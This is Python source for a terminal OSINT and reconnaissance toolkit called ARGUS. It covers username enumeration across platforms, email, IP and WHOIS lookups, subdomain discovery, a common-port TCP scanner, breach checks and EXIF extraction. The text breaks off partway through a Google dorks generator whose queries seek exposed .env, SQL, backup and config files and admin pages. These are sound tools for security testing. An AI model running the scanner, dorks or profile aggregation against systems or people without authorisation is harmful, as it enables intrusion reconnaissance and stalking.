#!/usr/bin/env python3
"""
ARGUS - All-seeing Recon & General Unified Security
A comprehensive terminal-based OSINT (Open Source Intelligence) tool.
"""

import hashlib
import io
import json
import re
import socket
import struct
import sys
import time
import concurrent.futures
import threading
import random
import string
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    print("[!] 'requests' is required. Install with: pip install requests")
    sys.exit(1)

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    print("[!] 'colorama' is required. Install with: pip install colorama")
    sys.exit(1)

try:
    import whois
except ImportError:
    whois = None

try:
    import dns.resolver
except ImportError:
    dns = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    from PIL import Image
    from PIL.ExifTags import TAGS
except ImportError:
    Image = None
    TAGS = None

# ─── Color shortcuts ───────────────────────────────────────────────────────────

C = Fore.CYAN
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
W = Fore.WHITE
M = Fore.MAGENTA
RST = Style.RESET_ALL

VERSION = "4.0.0"

# ─── ASCII Art Banner ──────────────────────────────────────────────────────────

BANNER = rf"""
{C}     █████╗ {R}██████╗ {C} ██████╗ {R}██╗   ██╗{C}███████╗
{C}    ██╔══██╗{R}██╔══██╗{C}██╔════╝ {R}██║   ██║{C}██╔════╝
{C}    ███████║{R}██████╔╝{C}██║  ███╗{R}██║   ██║{C}███████╗
{C}    ██╔══██║{R}██╔══██╗{C}██║   ██║{R}██║   ██║{C}╚════██║
{C}    ██║  ██║{R}██║  ██║{C}╚██████╔╝{R}╚██████╔╝{C}███████║
{C}    ╚═╝  ╚═╝{R}╚═╝  ╚═╝{C} ╚═════╝ {R} ╚═════╝ {C}╚══════╝{RST}

{W}              .-=========-.
{W}          .:-'  {R}({C}o{R}){W}     {R}({C}o{R}){W}  '-:.
{W}         /    .  {Y}\\___/{Y}  {W}.    \\
{W}         '-:.    {M}THE ALL{W}   .:-'
{W}              '-=========-'{RST}

{Y}    ╔══════════════════════════════════════╗
    ║  {W}A R G U S  -  T H E  A L L - S E E R{Y}  ║
    ╚══════════════════════════════════════╝{RST}
{C}        OSINT & Security Recon Toolkit
{W}                  v{VERSION}{RST}
"""

SEPARATOR = f"{C}{'─' * 60}{RST}"

# ─── Utility helpers ───────────────────────────────────────────────────────────

def spinner(msg, duration=1.0):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r{C}  {chars[i % len(chars)]} {msg}{RST}")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * (len(msg) + 10) + "\r")
    sys.stdout.flush()


def print_header(title):
    print(f"\n{SEPARATOR}")
    print(f"{Y}  ► {W}{title}{RST}")
    print(SEPARATOR)


def print_row(key, value):
    print(f"  {C}{key:<22}{RST} {W}{value}{RST}")


def print_ok(msg):
    print(f"  {G}[+]{RST} {msg}")


def print_warn(msg):
    print(f"  {Y}[!]{RST} {msg}")


def print_err(msg):
    print(f"  {R}[-]{RST} {msg}")


def prompt(label="Target"):
    return input(f"\n  {Y}{label}:{RST} ").strip()


def pause():
    input(f"\n  {C}Press Enter to continue...{RST}")


# ─── 1. Username Search ───────────────────────────────────────────────────────

PLATFORMS = {
    "GitHub": "https://github.com/{}",
    "Twitter/X": "https://x.com/{}",
    "Instagram": "https://www.instagram.com/{}/",
    "Reddit": "https://www.reddit.com/user/{}/",
    "TikTok": "https://www.tiktok.com/@{}",
    "Pinterest": "https://www.pinterest.com/{}/",
    "Tumblr": "https://{}.tumblr.com",
    "Medium": "https://medium.com/@{}",
    "DeviantArt": "https://www.deviantart.com/{}",
    "SoundCloud": "https://soundcloud.com/{}",
    "Flickr": "https://www.flickr.com/people/{}",
    "Vimeo": "https://vimeo.com/{}",
    "GitLab": "https://gitlab.com/{}",
    "Keybase": "https://keybase.io/{}",
    "HackerNews": "https://news.ycombinator.com/user?id={}",
    "Steam": "https://steamcommunity.com/id/{}",
    "Twitch": "https://www.twitch.tv/{}",
    "Spotify": "https://open.spotify.com/user/{}",
    "About.me": "https://about.me/{}",
    "SlideShare": "https://www.slideshare.net/{}",
    "Replit": "https://replit.com/@{}",
    "Linktree": "https://linktr.ee/{}",
    "YouTube": "https://www.youtube.com/@{}",
}


def check_platform(platform, url, session):
    try:
        resp = session.get(url, timeout=8, allow_redirects=True)
        if resp.status_code == 200:
            return platform, url, True
    except Exception:
        pass
    return platform, url, False


def username_search():
    print_header("Username Search")
    username = prompt("Username")
    if not username:
        return

    spinner("Searching platforms...", 1.0)
    found = 0
    with requests.Session() as session:
        session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS OSINT Tool)"})
        futures = {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            for platform, url_tpl in PLATFORMS.items():
                url = url_tpl.format(username)
                futures[pool.submit(check_platform, platform, url, session)] = platform
            for future in concurrent.futures.as_completed(futures):
                platform, url, exists = future.result()
                if exists:
                    print_ok(f"{platform:<16} {G}{url}{RST}")
                    found += 1
                else:
                    print_err(f"{platform:<16} Not found")

    print(f"\n  {Y}Results: {G}{found}{Y}/{len(PLATFORMS)} platforms{RST}")


# ─── 2. Email Lookup ──────────────────────────────────────────────────────────

def email_lookup():
    print_header("Email Lookup")
    email = prompt("Email address")
    if not email:
        return

    pattern = r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$"
    if not re.match(pattern, email):
        print_err("Invalid email format")
        return

    spinner("Analyzing email...", 0.8)
    local, domain = email.split("@")
    print_row("Local Part", local)
    print_row("Domain", domain)
    print_row("Provider", domain.split(".")[0].title())

    # Gravatar check
    email_hash = hashlib.md5(email.lower().strip().encode()).hexdigest()
    gravatar_url = f"https://www.gravatar.com/avatar/{email_hash}?d=404"
    try:
        resp = requests.get(gravatar_url, timeout=5)
        if resp.status_code == 200:
            print_ok(f"Gravatar found: https://www.gravatar.com/avatar/{email_hash}")
        else:
            print_warn("No Gravatar profile")
    except Exception:
        print_warn("Could not check Gravatar")

    # MX record
    if dns:
        try:
            answers = dns.resolver.resolve(domain, "MX")
            for rdata in answers:
                print_row("Mail Server", str(rdata.exchange).rstrip("."))
        except Exception:
            print_warn("Could not resolve MX records")
    else:
        print_warn("dnspython not installed — skipping MX lookup")


# ─── 3. Phone Number Lookup ───────────────────────────────────────────────────

def phone_lookup():
    print_header("Phone Number Lookup")
    phone = prompt("Phone number (with country code, e.g. +1234567890)")
    if not phone:
        return

    spinner("Looking up phone number...", 0.8)
    try:
        resp = requests.get(
            f"http://apilayer.net/api/validate?access_key=demo&number={phone}",
            timeout=8,
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get("valid"):
                print_row("Valid", str(data.get("valid", "N/A")))
                print_row("Country", data.get("country_name", "N/A"))
                print_row("Location", data.get("location", "N/A"))
                print_row("Carrier", data.get("carrier", "N/A"))
                print_row("Line Type", data.get("line_type", "N/A"))
            else:
                print_warn("Number could not be validated via API")
                print_warn("Performing basic analysis instead...")
        else:
            raise Exception("API unavailable")
    except Exception:
        # Fallback basic analysis
        cleaned = re.sub(r"[^\d+]", "", phone)
        print_row("Cleaned Number", cleaned)
        country_prefixes = {
            "+1": "United States / Canada",
            "+44": "United Kingdom",
            "+39": "Italy",
            "+49": "Germany",
            "+33": "France",
            "+34": "Spain",
            "+81": "Japan",
            "+86": "China",
            "+91": "India",
            "+61": "Australia",
            "+55": "Brazil",
            "+7": "Russia",
            "+82": "South Korea",
            "+52": "Mexico",
            "+31": "Netherlands",
        }
        detected = "Unknown"
        for prefix, country in sorted(country_prefixes.items(), key=lambda x: -len(x[0])):
            if cleaned.startswith(prefix):
                detected = country
                break
        print_row("Country (guess)", detected)
        print_row("Digits", str(len(re.sub(r"\D", "", cleaned))))


# ─── 4. IP Address Lookup ─────────────────────────────────────────────────────

def ip_lookup():
    print_header("IP Address Lookup")
    ip = prompt("IP address")
    if not ip:
        return

    spinner("Querying geolocation...", 0.8)
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=8)
        data = resp.json()
        if data.get("status") == "success":
            print_row("IP", data.get("query", ip))
            print_row("Country", f"{data.get('country', 'N/A')} ({data.get('countryCode', '')})")
            print_row("Region", data.get("regionName", "N/A"))
            print_row("City", data.get("city", "N/A"))
            print_row("ZIP", data.get("zip", "N/A"))
            print_row("Latitude", str(data.get("lat", "N/A")))
            print_row("Longitude", str(data.get("lon", "N/A")))
            print_row("Timezone", data.get("timezone", "N/A"))
            print_row("ISP", data.get("isp", "N/A"))
            print_row("Organization", data.get("org", "N/A"))
            print_row("AS Number", data.get("as", "N/A"))
            print_row("Mobile", str(data.get("mobile", "N/A")))
            print_row("Proxy/VPN", str(data.get("proxy", "N/A")))
            print_row("Hosting", str(data.get("hosting", "N/A")))
        else:
            print_err(f"Lookup failed: {data.get('message', 'Unknown error')}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 5. WHOIS Lookup ──────────────────────────────────────────────────────────

def whois_lookup():
    print_header("WHOIS Lookup")
    domain = prompt("Domain")
    if not domain:
        return

    if not whois:
        print_err("python-whois not installed. Run: pip install python-whois")
        return

    spinner("Querying WHOIS...", 1.0)
    try:
        w = whois.whois(domain)
        print_row("Domain", w.domain_name if isinstance(w.domain_name, str) else str(w.domain_name))
        print_row("Registrar", str(w.registrar or "N/A"))
        print_row("Creation Date", str(w.creation_date or "N/A"))
        print_row("Expiration Date", str(w.expiration_date or "N/A"))
        print_row("Updated Date", str(w.updated_date or "N/A"))
        print_row("Name Servers", str(w.name_servers or "N/A"))
        print_row("Status", str(w.status or "N/A"))
        print_row("Registrant", str(w.get("name", "N/A")))
        print_row("Org", str(w.get("org", "N/A")))
        print_row("Country", str(w.get("country", "N/A")))
        print_row("DNSSEC", str(w.get("dnssec", "N/A")))
    except Exception as e:
        print_err(f"WHOIS lookup failed: {e}")


# ─── 6. DNS Lookup ────────────────────────────────────────────────────────────

def dns_lookup():
    print_header("DNS Lookup")
    domain = prompt("Domain")
    if not domain:
        return

    if not dns:
        print_err("dnspython not installed. Run: pip install dnspython")
        return

    spinner("Resolving DNS records...", 0.8)
    record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
    for rtype in record_types:
        try:
            answers = dns.resolver.resolve(domain, rtype)
            for rdata in answers:
                print_row(rtype, str(rdata).rstrip("."))
        except dns.resolver.NoAnswer:
            pass
        except dns.resolver.NXDOMAIN:
            print_err(f"Domain {domain} does not exist")
            return
        except Exception:
            pass


# ─── 7. Subdomain Enumeration ─────────────────────────────────────────────────

def subdomain_enum():
    print_header("Subdomain Enumeration (crt.sh)")
    domain = prompt("Domain")
    if not domain:
        return

    spinner("Querying crt.sh for certificates...", 1.5)
    try:
        resp = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15,
        )
        if resp.status_code != 200:
            print_err("crt.sh returned an error")
            return

        data = resp.json()
        subdomains = set()
        for entry in data:
            name = entry.get("name_value", "")
            for sub in name.split("\n"):
                sub = sub.strip().lower()
                if sub.endswith(domain) and "*" not in sub:
                    subdomains.add(sub)

        if subdomains:
            for i, sub in enumerate(sorted(subdomains), 1):
                print(f"  {C}{i:>4}.{RST} {W}{sub}{RST}")
            print(f"\n  {Y}Total: {G}{len(subdomains)}{Y} subdomains found{RST}")
        else:
            print_warn("No subdomains found")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 8. HTTP Headers Analysis ─────────────────────────────────────────────────

def http_headers():
    print_header("HTTP Headers Analysis")
    url = prompt("URL (e.g. https://example.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Fetching headers...", 0.8)
    try:
        resp = requests.head(url, timeout=8, allow_redirects=True,
                             headers={"User-Agent": "ARGUS/1.0"})
        print_row("Status Code", str(resp.status_code))
        print_row("Final URL", resp.url)
        print()
        for header, value in resp.headers.items():
            print_row(header, value)

        # Security header checks
        print(f"\n  {Y}Security Header Checks:{RST}")
        security_headers = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "Clickjacking Protection",
            "X-Content-Type-Options": "MIME Sniffing Protection",
            "X-XSS-Protection": "XSS Filter",
            "Referrer-Policy": "Referrer Policy",
        }
        for hdr, label in security_headers.items():
            if hdr.lower() in [h.lower() for h in resp.headers]:
                print_ok(f"{label}: Present")
            else:
                print_warn(f"{label}: Missing")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 9. Website Technology Detection ──────────────────────────────────────────

def tech_detect():
    print_header("Website Technology Detection")
    url = prompt("URL (e.g. https://example.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Analyzing website...", 1.2)
    try:
        resp = requests.get(url, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0 (ARGUS OSINT)"})
        headers = resp.headers
        body = resp.text.lower()

        techs = []

        # Server
        server = headers.get("Server", "")
        if server:
            techs.append(("Server", server))
        powered = headers.get("X-Powered-By", "")
        if powered:
            techs.append(("Powered By", powered))

        # Frameworks / CMS
        signatures = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Joomla": ["joomla", "/media/system/js/"],
            "Drupal": ["drupal", "sites/all/", "sites/default/"],
            "React": ["react", "_react", "reactdom", "__next"],
            "Angular": ["ng-version", "angular"],
            "Vue.js": ["vue.js", "vue.min.js", "__vue__"],
            "jQuery": ["jquery"],
            "Bootstrap": ["bootstrap.min.css", "bootstrap.min.js"],
            "Tailwind CSS": ["tailwindcss", "tailwind"],
            "Next.js": ["__next", "_next/static"],
            "Nuxt.js": ["__nuxt", "_nuxt/"],
            "Laravel": ["laravel", "csrf-token"],
            "Django": ["csrfmiddlewaretoken", "django"],
            "Flask": ["flask"],
            "Ruby on Rails": ["rails", "csrf-token", "turbolinks"],
            "Cloudflare": ["cloudflare"],
            "Google Analytics": ["google-analytics.com", "gtag(", "ga("],
            "Google Tag Manager": ["googletagmanager.com"],
            "Shopify": ["shopify", "cdn.shopify.com"],
            "Wix": ["wix.com", "parastorage.com"],
            "Squarespace": ["squarespace"],
        }

        cf_header = headers.get("cf-ray", "") or headers.get("CF-RAY", "")
        if cf_header:
            techs.append(("CDN", "Cloudflare"))

        for tech, patterns in signatures.items():
            for pattern in patterns:
                if pattern in body:
                    techs.append(("Technology", tech))
                    break

        if techs:
            seen = set()
            for category, tech in techs:
                key = f"{category}:{tech}"
                if key not in seen:
                    seen.add(key)
                    print_row(category, tech)
        else:
            print_warn("No technologies detected")

    except Exception as e:
        print_err(f"Error: {e}")


# ─── 10. Port Scanner ─────────────────────────────────────────────────────────

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPCbind", 135: "MSRPC",
    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
    6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB",
}


def scan_port(host, port, timeout):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return port, result == 0
    except Exception:
        return port, False


def port_scanner():
    print_header("Port Scanner")
    host = prompt("Target host (IP or domain)")
    if not host:
        return

    print_warn("This is an authorized security testing tool.")
    print_warn("Only scan hosts you have permission to scan.")

    spinner("Resolving host...", 0.5)
    try:
        ip = socket.gethostbyname(host)
        print_row("Resolved IP", ip)
    except socket.gaierror:
        print_err("Could not resolve hostname")
        return

    spinner("Scanning ports...", 0.5)
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(scan_port, ip, port, 1.5): port for port in COMMON_PORTS}
        for future in concurrent.futures.as_completed(futures):
            port, is_open = future.result()
            if is_open:
                service = COMMON_PORTS.get(port, "Unknown")
                open_ports.append((port, service))
                print_ok(f"Port {port:<6} {G}OPEN{RST}    {service}")

    if not open_ports:
        print_warn("No open ports found (common ports only)")
    else:
        print(f"\n  {Y}Open ports: {G}{len(open_ports)}{Y}/{len(COMMON_PORTS)}{RST}")


# ─── 11. Reverse DNS Lookup ───────────────────────────────────────────────────

def reverse_dns():
    print_header("Reverse DNS Lookup")
    ip = prompt("IP address")
    if not ip:
        return

    spinner("Resolving...", 0.5)
    try:
        hostname, aliases, _ = socket.gethostbyaddr(ip)
        print_row("Hostname", hostname)
        if aliases:
            for alias in aliases:
                print_row("Alias", alias)
    except socket.herror:
        print_err("No PTR record found for this IP")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 12. MAC Address Lookup ───────────────────────────────────────────────────

def mac_lookup():
    print_header("MAC Address Lookup")
    mac = prompt("MAC address (e.g. AA:BB:CC:DD:EE:FF)")
    if not mac:
        return

    cleaned = re.sub(r"[^a-fA-F0-9]", "", mac)
    if len(cleaned) != 12:
        print_err("Invalid MAC address format")
        return

    oui = cleaned[:6].upper()
    formatted = ":".join(cleaned[i:i+2].upper() for i in range(0, 12, 2))
    print_row("MAC Address", formatted)
    print_row("OUI Prefix", f"{oui[:2]}:{oui[2:4]}:{oui[4:6]}")

    spinner("Looking up vendor...", 0.8)
    try:
        resp = requests.get(f"https://api.macvendors.com/{formatted}", timeout=8)
        if resp.status_code == 200:
            print_row("Vendor", resp.text.strip())
        else:
            print_warn("Vendor not found")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 13. Email Breach Check ───────────────────────────────────────────────────

def email_breach_check():
    print_header("Email Breach Check")
    email = prompt("Email address")
    if not email:
        return

    spinner("Checking breach databases...", 1.0)

    # Using the free breach directory API
    try:
        resp = requests.get(
            f"https://api.xposedornot.com/v1/check-email/{email}",
            timeout=10,
            headers={"User-Agent": "ARGUS OSINT Tool"},
        )
        if resp.status_code == 200:
            data = resp.json()
            breaches = data.get("breaches", [])
            if breaches:
                print_err(f"Email found in {R}{len(breaches)}{RST} breach(es)!")
                for b in breaches[:20]:
                    if isinstance(b, str):
                        print(f"    {R}•{RST} {b}")
                    elif isinstance(b, dict):
                        print(f"    {R}•{RST} {b.get('name', b)}")
            else:
                print_ok("No breaches found for this email")
        elif resp.status_code == 404:
            print_ok("No breaches found for this email")
        else:
            print_warn("Breach check API returned unexpected status")
            print_warn("Try manually at: https://haveibeenpwned.com/")
    except Exception:
        print_warn("Could not reach breach-check API")
        print_warn("Try manually at: https://haveibeenpwned.com/")


# ─── 14. Metadata Extractor ───────────────────────────────────────────────────

def metadata_extractor():
    print_header("Image Metadata Extractor")
    url = prompt("Image URL")
    if not url:
        return

    if not Image:
        print_err("Pillow not installed. Run: pip install Pillow")
        return

    spinner("Downloading image...", 1.0)
    try:
        resp = requests.get(url, timeout=15, stream=True,
                            headers={"User-Agent": "ARGUS OSINT Tool"})
        if resp.status_code != 200:
            print_err("Could not download image")
            return

        img = Image.open(io.BytesIO(resp.content))
        print_row("Format", img.format or "Unknown")
        print_row("Size", f"{img.size[0]}x{img.size[1]}")
        print_row("Mode", img.mode)

        exif_data = img._getexif()
        if exif_data:
            print(f"\n  {Y}EXIF Data:{RST}")
            for tag_id, value in exif_data.items():
                tag = TAGS.get(tag_id, tag_id)
                if isinstance(value, bytes):
                    value = value.hex()[:40]
                print_row(str(tag), str(value)[:60])
        else:
            print_warn("No EXIF data found in this image")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 15. Social Media Scraper ─────────────────────────────────────────────────

def social_scraper():
    print_header("Social Media Profile Scraper")
    username = prompt("Username")
    if not username:
        return

    if not BeautifulSoup:
        print_err("beautifulsoup4 not installed. Run: pip install beautifulsoup4")
        return

    spinner("Gathering social profiles...", 1.2)
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    })

    profiles = {
        "GitHub": {
            "url": f"https://api.github.com/users/{username}",
            "api": True,
            "fields": ["name", "bio", "public_repos", "followers", "following",
                       "location", "company", "blog", "created_at"],
        },
        "Reddit": {
            "url": f"https://www.reddit.com/user/{username}/about.json",
            "api": True,
            "fields": ["name", "total_karma", "created_utc"],
        },
    }

    for platform, config in profiles.items():
        print(f"\n  {M}── {platform} ──{RST}")
        try:
            resp = session.get(config["url"], timeout=8)
            if resp.status_code == 200:
                data = resp.json()
                if platform == "Reddit":
                    data = data.get("data", data)
                for field in config["fields"]:
                    value = data.get(field, "N/A")
                    if value and value != "N/A":
                        label = field.replace("_", " ").title()
                        print_row(label, str(value))
                print_ok(f"{platform} profile found")
            elif resp.status_code == 404:
                print_warn(f"{platform} profile not found")
            else:
                print_warn(f"{platform} returned status {resp.status_code}")
        except Exception as e:
            print_err(f"{platform} error: {e}")

    # Additional URL checks
    print(f"\n  {M}── Quick Profile Links ──{RST}")
    quick_links = {
        "Twitter/X": f"https://x.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}/",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
        "YouTube": f"https://www.youtube.com/@{username}",
    }
    for platform, url in quick_links.items():
        print_row(platform, url)


# ─── 16. SSL/TLS Certificate Info ─────────────────────────────────────────────

def ssl_cert_info():
    print_header("SSL/TLS Certificate Info")
    host = prompt("Domain (e.g. google.com)")
    if not host:
        return

    import ssl
    import datetime

    spinner("Fetching SSL certificate...", 1.0)
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(8)
            s.connect((host, 443))
            cert = s.getpeercert()

        subject = dict(x[0] for x in cert.get("subject", ()))
        issuer = dict(x[0] for x in cert.get("issuer", ()))

        print_row("Common Name", subject.get("commonName", "N/A"))
        print_row("Organization", subject.get("organizationName", "N/A"))
        print_row("Issuer", issuer.get("organizationName", "N/A"))
        print_row("Issuer CN", issuer.get("commonName", "N/A"))
        print_row("Valid From", cert.get("notBefore", "N/A"))
        print_row("Valid Until", cert.get("notAfter", "N/A"))
        print_row("Serial Number", cert.get("serialNumber", "N/A"))
        print_row("Version", str(cert.get("version", "N/A")))

        # Check expiry
        not_after = cert.get("notAfter", "")
        if not_after:
            exp = datetime.datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
            days_left = (exp - datetime.datetime.utcnow()).days
            if days_left < 0:
                print_err(f"Certificate EXPIRED {abs(days_left)} days ago!")
            elif days_left < 30:
                print_warn(f"Certificate expires in {days_left} days")
            else:
                print_ok(f"Certificate valid for {days_left} more days")

        # SANs
        san = cert.get("subjectAltName", ())
        if san:
            print(f"\n  {Y}Subject Alt Names:{RST}")
            for type_, value in san[:20]:
                print(f"    {C}•{RST} {value}")
            if len(san) > 20:
                print(f"    {Y}... and {len(san) - 20} more{RST}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 17. Wayback Machine Lookup ──────────────────────────────────────────────

def wayback_lookup():
    print_header("Wayback Machine Lookup")
    url = prompt("URL or domain")
    if not url:
        return

    spinner("Querying Wayback Machine...", 1.2)
    try:
        # Check availability
        resp = requests.get(
            f"https://archive.org/wayback/available?url={url}",
            timeout=10,
        )
        data = resp.json()
        snapshot = data.get("archived_snapshots", {}).get("closest", {})
        if snapshot:
            print_ok("Archived snapshot found!")
            print_row("Archive URL", snapshot.get("url", "N/A"))
            print_row("Timestamp", snapshot.get("timestamp", "N/A"))
            print_row("Status", snapshot.get("status", "N/A"))
        else:
            print_warn("No snapshot available")

        # Get CDX summary (number of captures)
        resp2 = requests.get(
            f"https://web.archive.org/cdx/search/cdx?url={url}&output=json&limit=1&fl=timestamp",
            timeout=10,
        )
        resp3 = requests.get(
            f"https://web.archive.org/cdx/search/cdx?url={url}&output=json&limit=1&fl=timestamp&sort=closest&from=19960101",
            timeout=10,
        )

        # Count total snapshots
        resp_count = requests.get(
            f"https://web.archive.org/cdx/search/cdx?url={url}&output=json&fl=timestamp&collapse=timestamp:6",
            timeout=15,
        )
        if resp_count.status_code == 200:
            try:
                rows = resp_count.json()
                count = len(rows) - 1  # subtract header row
                if count > 0:
                    print_row("Total Snapshots", f"~{count} (monthly unique)")
                    first = rows[1][0] if len(rows) > 1 else "N/A"
                    last = rows[-1][0] if len(rows) > 1 else "N/A"
                    print_row("First Capture", first)
                    print_row("Last Capture", last)
            except (ValueError, IndexError):
                pass

        print(f"\n  {Y}Browse full history:{RST}")
        print(f"  {W}https://web.archive.org/web/*/{url}{RST}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 18. Robots.txt & Sitemap Analyzer ───────────────────────────────────────

def robots_sitemap():
    print_header("Robots.txt & Sitemap Analyzer")
    domain = prompt("Domain (e.g. example.com)")
    if not domain:
        return
    if not domain.startswith(("http://", "https://")):
        domain = "https://" + domain
    base = domain.rstrip("/")

    spinner("Fetching robots.txt...", 0.8)
    try:
        resp = requests.get(f"{base}/robots.txt", timeout=8,
                            headers={"User-Agent": "ARGUS OSINT Tool"})
        if resp.status_code == 200:
            print_ok("robots.txt found!")
            lines = resp.text.strip().splitlines()
            disallowed = []
            sitemaps = []
            for line in lines:
                stripped = line.strip()
                if stripped.lower().startswith("disallow:"):
                    path = stripped.split(":", 1)[1].strip()
                    if path:
                        disallowed.append(path)
                elif stripped.lower().startswith("sitemap:"):
                    sitemaps.append(stripped.split(":", 1)[1].strip())

            if disallowed:
                print(f"\n  {Y}Disallowed Paths ({len(disallowed)}):{RST}")
                for p in disallowed[:30]:
                    print(f"    {R}•{RST} {p}")
                if len(disallowed) > 30:
                    print(f"    {Y}... and {len(disallowed) - 30} more{RST}")

            if sitemaps:
                print(f"\n  {Y}Sitemaps ({len(sitemaps)}):{RST}")
                for s in sitemaps:
                    print(f"    {G}•{RST} {s}")
        else:
            print_warn(f"robots.txt not found (HTTP {resp.status_code})")
    except Exception as e:
        print_err(f"Error fetching robots.txt: {e}")

    # Try sitemap.xml
    spinner("Fetching sitemap.xml...", 0.8)
    try:
        resp = requests.get(f"{base}/sitemap.xml", timeout=8,
                            headers={"User-Agent": "ARGUS OSINT Tool"})
        if resp.status_code == 200 and "<?xml" in resp.text[:200]:
            print_ok("sitemap.xml found!")
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, "html.parser")
                urls = soup.find_all("loc")
                print_row("URLs in Sitemap", str(len(urls)))
                for u in urls[:15]:
                    print(f"    {C}•{RST} {u.text}")
                if len(urls) > 15:
                    print(f"    {Y}... and {len(urls) - 15} more{RST}")
            else:
                count = resp.text.count("<loc>")
                print_row("URLs (approx)", str(count))
        else:
            print_warn("sitemap.xml not found")
    except Exception as e:
        print_err(f"Error fetching sitemap.xml: {e}")


# ─── 19. Link Extractor ─────────────────────────────────────────────────────

def link_extractor():
    print_header("Link Extractor")
    url = prompt("URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    if not BeautifulSoup:
        print_err("beautifulsoup4 not installed. Run: pip install beautifulsoup4")
        return

    spinner("Extracting links...", 1.0)
    try:
        resp = requests.get(url, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0 (ARGUS OSINT)"})
        soup = BeautifulSoup(resp.text, "html.parser")
        parsed_base = urlparse(url)

        internal = set()
        external = set()
        resources = {"js": set(), "css": set(), "img": set()}

        for tag in soup.find_all("a", href=True):
            href = tag["href"].strip()
            if href.startswith(("#", "mailto:", "tel:", "javascript:")):
                continue
            parsed = urlparse(href)
            if not parsed.netloc or parsed.netloc == parsed_base.netloc:
                internal.add(href)
            else:
                external.add(href)

        for tag in soup.find_all("script", src=True):
            resources["js"].add(tag["src"])
        for tag in soup.find_all("link", rel=True, href=True):
            if "stylesheet" in tag.get("rel", []):
                resources["css"].add(tag["href"])
        for tag in soup.find_all("img", src=True):
            resources["img"].add(tag["src"])

        print(f"\n  {Y}Internal Links ({len(internal)}):{RST}")
        for link in sorted(internal)[:20]:
            print(f"    {G}•{RST} {link}")
        if len(internal) > 20:
            print(f"    {Y}... and {len(internal) - 20} more{RST}")

        print(f"\n  {Y}External Links ({len(external)}):{RST}")
        for link in sorted(external)[:20]:
            print(f"    {C}•{RST} {link}")
        if len(external) > 20:
            print(f"    {Y}... and {len(external) - 20} more{RST}")

        print(f"\n  {Y}Resources:{RST}")
        print_row("JavaScript Files", str(len(resources["js"])))
        print_row("CSS Files", str(len(resources["css"])))
        print_row("Images", str(len(resources["img"])))
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 20. Google Dorks Generator ──────────────────────────────────────────────

def google_dorks():
    print_header("Google Dorks Generator")
    target = prompt("Target domain or keyword")
    if not target:
        return

    spinner("Generating dorks...", 0.5)
    dorks = [
        (f'site:{target}', "All indexed pages"),
        (f'site:{target} filetype:pdf', "PDF documents"),
        (f'site:{target} filetype:doc OR filetype:docx', "Word documents"),
        (f'site:{target} filetype:xls OR filetype:xlsx', "Spreadsheets"),
        (f'site:{target} filetype:sql', "SQL files"),
        (f'site:{target} filetype:log', "Log files"),
        (f'site:{target} filetype:env', "Environment files"),
        (f'site:{target} filetype:xml', "XML files"),
        (f'site:{target} filetype:conf OR filetype:cfg', "Configuration files"),
        (f'site:{target} filetype:bak OR filetype:old', "Backup files"),
        (f'site:{target} inurl:admin', "Admin pages"),
        (f'site:{target} inurl:login', "Login pages"),
        (f'site:{target} inurl:dashboard', "Dashboard pages"),
        (f'site:{target} inurl:api', "API endpoints"),
        (f'site:{target} intitle:"index of"', "Directory listings"),
